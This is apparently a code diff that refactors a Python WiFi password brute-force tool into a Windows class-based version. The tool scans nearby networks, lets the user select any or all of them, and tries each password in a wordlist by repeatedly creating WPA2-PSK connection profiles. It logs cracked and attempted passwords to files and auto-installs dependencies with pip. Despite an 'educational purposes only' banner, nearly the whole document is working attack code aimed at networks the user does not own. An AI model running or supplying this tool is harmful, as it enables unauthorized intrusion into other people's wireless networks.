@@ -1,163 +1,295 @@
-import os
-import platform
-import sys
-try:
-    import pywifi
-except ModuleNotFoundError:
-    os.system("pip install pywifi")
+import os, re, sys, time, shutil, ctypes, argparse, platform, threading, subprocess, collections
+from datetime import timedelta
+from utils import Colors, banner, clear, sprint, print_header, get_input, print_table, print_status, print_progress_bar, print_menu, confirm_action, gradient_print, get_terminal_size
+
+for package in ['keyboard', 'pywifi', 'tqdm', 'colorama']:
+    try:
+        __import__(package)
+    except ModuleNotFoundError:
+        print(f"{package} not found. Installing...")
+        os.system(f"pip install {package}")
+
+import pywifi, keyboard
 from pywifi import const
-from scripts.banner import banner2,banner,clear
-from scripts.sprint import sprint
-from scripts.colors import ran,y,r,g,c
+from tqdm import tqdm
 
-import time
+DEFAULT_WORDLIST = "passwords.txt"
+CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
+ATTEMPTED_PASSWORDS_FILE = "attempted_passwords.txt"
+DEFAULT_TIMEOUT = 15
 
+class WifiCracker:
+    def __init__(self, interface, timeout, wordlist):
+        self.interface = interface
+        self.timeout = timeout
+        self.passwords = self.load_passwords(wordlist)
+        self.cracked_passwords = self.load_history(CRACKED_PASSWORDS_FILE)
+        self.attempted_passwords = self.load_history(ATTEMPTED_PASSWORDS_FILE)
+        self.paused = False
+        self.stop_cracking = False
+        self.current_ssid = ""
+        self.current_password = ""
+        self.idx = 0
+        self.total_passwords = 0
 
-yes = ["y" , "yes"]
-no = ["no" , "n"]
+    @staticmethod
+    def load_passwords(wordlist):
+        with open(wordlist, encoding="UTF-8", errors="ignore") as f:
+            return [x.strip() for x in f]
 
-def help():
-    print(f"\t{r}-> {c}Usage:~ {y}python3 wifi-brute.py <wordlist>\n\t{r}-> {c}python3 wifi-brute.py {y}(it wil use default wordlist")
-    exit()
+    @staticmethod
+    def load_history(filename):
+        history = collections.defaultdict(list)
+        if os.path.exists(filename):
+            with open(filename) as f:
+                for line in f:
+                    ssid, password = line.strip().split("--")
+                    history[ssid].append(password)
+        return history
 
+    @staticmethod
+    def save_to_history(filename, ssid, password):
+        with open(filename, "a") as f:
+            f.write(f"{ssid}--{password}\n")
 
-if len(sys.argv) < 2:
-    p_in = "passwords.txt"
+    def scan_wifi(self):
+        def perform_scan():
+            print_status("Scanning for WiFi networks", "IN PROGRESS")
+            with tqdm(total=100, bar_format="{l_bar}{bar}", colour='cyan', desc="Scanning") as pbar:
+                self.interface.scan()
+                for i in range(100):
+                    time.sleep(0.03)
+                    pbar.update(1)
+                return self.interface.scan_results()
+        try:
+            networks = perform_scan()
+        except ValueError:
+            print_status("Turning on Wi-Fi", "WAIT")
+            os.system("powershell -File TurnWiFiOn.ps1")
+            time.sleep(10)
+            networks = perform_scan()
 
-elif sys.argv[1] == "--help":
-    help()
+        print_status("WiFi scan completed", "SUCCESS")
+        return networks
 
-else:
-    p_in = sys.argv[1]
-
-
-def rootCHEK():
-    s = os.popen("whoami").read()
-    print(s)
-    if ("root") in s:
-        print("You are root")
-        pass
-    else:
-        if "aarch64" in platform.machine():
-            print("Run this tool as root in Termux.")
-            exit()
-        if "Linux" in platform.platform():
-            print("Root your terminal for better performance")
-            os.system("sudo su")
-        if "Windows" in platform.platform():
-            print("Iam developed to work on Windows. Dont worry i'll take care of next!")
-
-        time.sleep(3)
-
-rootCHEK()
-
-
-clear()
-
-sprint(f"\n\n{r} Note: {c}This tool is only made for educational purpose... -_+")
-sprint(f"\n{g}Preparing...")
-time.sleep(2)
-clear()
-banner()
-
-
-
-
-passlist = p_in
-
-
-passwords = [x.strip("\n") for x in open(passlist , "r", encoding="UTF-8" , errors="ignore").readlines()]
-tried = [x.strip("\n").split("--")[0] for x in open("avail_nearby_wifis.txt","r").readlines()]
-found = [x.strip("\n") for x in open("already_tried_passwords.txt","r").readlines()]
-ts = 15
-
-
-def scan(face):
-    face.scan()
-    return face.scan_results()
-
-def main():
-    wifi = pywifi.PyWiFi()
-    inface = wifi.interfaces()[0]
-
-    scanner = scan(inface)
-
-    num = len(scanner)
-
-    print(f"{r}Number of wifi found: {ran}{str(num)}")
-    input(f"{y}\nPress enter to start___")
-          
-    for i,x in enumerate(scanner):
-        res = test(num-i , inface , x , passwords , ts)
-
-        if res:
-            print(ran + "="*20)
-            print(f"{r}Password found : {c}{str(res)}\n")
-
-            with open("avail_nearby_wifis.txt", "a") as f:
-                f.write(str(res) + "\n")
-
-            print(ran + "="*20)
-
-
-def test(i ,face,x,key,ts):
-    wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
-
-    if wifi_name in tried:
-        print(f"{r}[!] {y}Password tried -- {str(wifi_name)}\n{g}Password is known!")
-        return False
-
-    print(ran + "Trying to connect to wifi "+str(wifi_name))
-
-    for n,password in enumerate(key):
-        if wifi_name+"--"+password in found:
-            print(r + "Password already found +_+")
-
-            continue
-        else:
-            with open("already_tried_password" , "a") as f:
-                f.write(str(wifi_name)+"--"+str(password)+"\n")
-        tried.append(str(wifi_name)+"--"+str(password))
-        print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")
-
+    def connect_to_wifi(self, ssid, password, is_hidden=False):
         profile = pywifi.Profile()
-        profile.ssid = wifi_name
+        profile.ssid = ssid
         profile.auth = const.AUTH_ALG_OPEN
         profile.akm.append(const.AKM_TYPE_WPA2PSK)
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
-        # Remove all hotspot configurations
-        face.remove_all_network_profiles()
-        tmp_profile = face.add_network_profile(profile)
-        face.connect(tmp_profile)
-        code = 10
-        t1 = time.time()
-        # Cyclic refresh status, if set to 0, the password is wrong, if timeout, proceed to the next
-        while code != 0:
+        profile.hidden = is_hidden
+        self.interface.remove_all_network_profiles()
+        tmp_profile = self.interface.add_network_profile(profile)
+        self.interface.connect(tmp_profile)
+        start_time = time.time()
+        while time.time() - start_time < self.timeout:
+            if self.stop_cracking:
+                return False
+            if self.paused:
+                self.interface.disconnect()
+                return None
+            if self.interface.status() == const.IFACE_CONNECTED:
+                return True
             time.sleep(0.1)
-            code = face.status()
-            now = time.time() - t1
-            if now > ts:
+        return False
+
+    def crack_wifi(self, ssid, is_hidden=False):
+        if ssid in self.cracked_passwords:
+            print_status(f"Password already found for {ssid}", "SUCCESS")
+            return self.cracked_passwords[ssid][0]
+
+        self.current_ssid = ssid
+        self.total_passwords = len(self.passwords)
+        self.idx = 0
+
+        print_header(f"Cracking {ssid}")
+        terminal_width = get_terminal_size()[0]
+        while self.idx < self.total_passwords:
+
+            if terminal_width != get_terminal_size()[0]:
+                clear()
+                terminal_width = get_terminal_size()[0]
+            if self.stop_cracking:
+                return None
+            
+            self.current_password = self.passwords[self.idx]
+            
+            if ssid in self.attempted_passwords and self.current_password in self.attempted_passwords[ssid]:
+                self.idx += 1
+                continue
+            
+            if not self.paused:
+                self.print_status_line()
+
+            while self.paused:
+                time.sleep(0.1)
+                if self.stop_cracking:
+                    return None
+
+            result = self.connect_to_wifi(ssid, self.current_password, is_hidden)
+            
+            if result is None:
+                continue
+            self.save_to_history(ATTEMPTED_PASSWORDS_FILE, ssid, self.current_password)
+            if result:
+                if ssid not in self.attempted_passwords:
+                    self.attempted_passwords[ssid] = []
+                self.attempted_passwords[ssid].append(self.current_password)
+                print_status(f"\n\nPassword found for {ssid}: {self.current_password}", "SUCCESS", start_color='#A020F0')
+                return self.current_password
+
+            self.idx += 1
+
+        print_status(f"No password found for {ssid}", "FAILED", success=False)
+        return None
+
+    def print_status_line(self):
+        eta = timedelta(seconds=int((self.total_passwords - self.idx) * (self.timeout + 0.1)))
+        print_progress_bar(
+            self.idx + 1, self.total_passwords,
+            prefix=f"Progress ({self.current_ssid}):",
+            suffix=f"Current password: {self.current_password} | ETA: {eta}      \r"
+        )
+
+    def handle_keyboard_input(self):
+        while not self.stop_cracking:
+            if keyboard.is_pressed('p'):
+                self.paused = not self.paused
+                if self.paused:
+                    clear()
+                    print(f'\n{Colors.YELLOW}Paused [{Colors.GREEN}p{Colors.YELLOW}]')
+                else:
+                    clear()
+                    print(f"\n{Colors.GREEN}Resumed\n")
+                    self.print_status_line()
+                time.sleep(0.2)
+            elif keyboard.is_pressed('q'):
+                self.stop_cracking = True
                 break
-            if code == 4:
-                face.disconnect()
-                return str(wifi_name) + "--" + str(password)
-    return False
+            time.sleep(0.1)
 
-cont = ""
+def check_privileges():
+    if platform.system() != "Windows":
+        print_status("Sorry, only made for Windows :(", "ERROR", success=False)
+        time.sleep(3)
+        sys.exit(1)
 
-while cont not in no:
-    main()
-
-    ch = input(ran+"Do you want to continue? (y/n):").lower()
-
-    if ch in no:
-        clear()
-        banner2()
+    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+        print_status("Administrative privileges", "DETECTED")
     else:
+        print_status("Run as administrator for better performance", "WARNING", success=False)
+    time.sleep(2)
+
+def display_networks(networks):
+    headers = ["ID", "SSID", "Signal Strength"]
+    rows = []
+    hidden_count = 0
+    for i, network in enumerate(networks, 1):
+        if network.ssid:
+            rows.append([str(i), network.ssid, str(network.signal)])
+        else:
+            hidden_count += 1
+            rows.append([str(i), f"Hidden Network {hidden_count}", str(network.signal)])
+    print_table(headers, rows)
+
+def select_networks(networks):
+    display_networks(networks)
+    while True:
+        selected = get_input("\nEnter the ID number(s) of the network(s) you want to crack (comma-separated) or 'all': ").strip().lower()
+        
+        if selected == 'all':
+            return networks
+        
+        cleaned_input = re.sub(r'\s*,\s*', ',', selected)
+        cleaned_input = re.sub(r',+', ',', cleaned_input)
+        
+        selections = cleaned_input.split(',')
+        
+        try:
+            indices = [int(x) - 1 for x in selections if x]
+            selected_networks = []
+            
+            for i in indices:
+                if 0 <= i < len(networks):
+                    selected_networks.append(networks[i])
+                else:
+                    print_status(f"Network ID {i+1} is out of range and will be skipped.", "WARNING", success=False)
+            
+            if selected_networks:
+                return selected_networks
+            else:
+                print_status("No valid networks selected. Please try again.", "ERROR", success=False)
+        except ValueError:
+            print_status("Invalid input. Please enter valid ID number(s) or 'all'", "ERROR", success=False)
+
+def main():
+    parser = argparse.ArgumentParser(description="WiFi Brute Force Tool")
+    parser.add_argument("-w", "--wordlist", default=DEFAULT_WORDLIST, help="Path to the wordlist file")
+    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT, help="Timeout for each connection attempt")
+    args = parser.parse_args()
+
+    check_privileges()
+    clear()
+    banner(show_logo=True)
+    sprint(f"Note: This tool is for educational purposes only.", delay=0.0008)
+    time.sleep(1)
+    clear()
+    banner(show_logo=True)
+
+    interface = pywifi.PyWiFi().interfaces()[0]
+    cracker = WifiCracker(interface, args.timeout, args.wordlist)
+
+    while True:
+        networks = cracker.scan_wifi()
+        networks = sorted(list({network.ssid: network for network in networks}.values()), key=lambda x: x.signal, reverse=True)
+        print_status(f"Number of unique WiFi networks found: {len(networks)}", "INFO")
+        
+        selected_networks = select_networks(networks)
+        if not confirm_action("Start cracking?"):
+            clear()
+            continue
+
         clear()
-        banner2()
+        print_header("Cracking Shortcuts")
+        sprint(f"Press 'p' to pause/unpause.", delay=0.0005)
+        sprint(f"Press 'q' to stop cracking.", delay=0.0005)
+        
+        keyboard_thread = threading.Thread(target=cracker.handle_keyboard_input)
+        keyboard_thread.start()
 
+        hidden_count = 0
+        for i, network in enumerate(selected_networks, 1):
+            if cracker.stop_cracking:
+                break
+            
+            ssid = network.ssid or f"Hidden Network {hidden_count + 1}"
+            hidden_count += 1
+            password = cracker.crack_wifi(ssid, not network.ssid)
+            if password:
+                if ssid not in cracker.cracked_passwords:
+                    cracker.cracked_passwords[ssid] = [password]
+                    cracker.save_to_history(CRACKED_PASSWORDS_FILE, ssid, password)
+            
+            if i < len(selected_networks) and not cracker.stop_cracking:
+                if not confirm_action("Continue cracking the next network?"):
+                    break
 
+        cracker.stop_cracking = True
+        keyboard_thread.join()
+        
+        if not confirm_action("Scan for networks again?"):
+            break
 
+        clear()
+        banner(show_logo=True)
+        cracker.paused = False
+        cracker.stop_cracking = False
 
+    clear()
+    banner(show_logo=True)
+    gradient_print("Thank you for using WiFi Brute. Goodbye!")
+
+if __name__ == "__main__":
+    main()
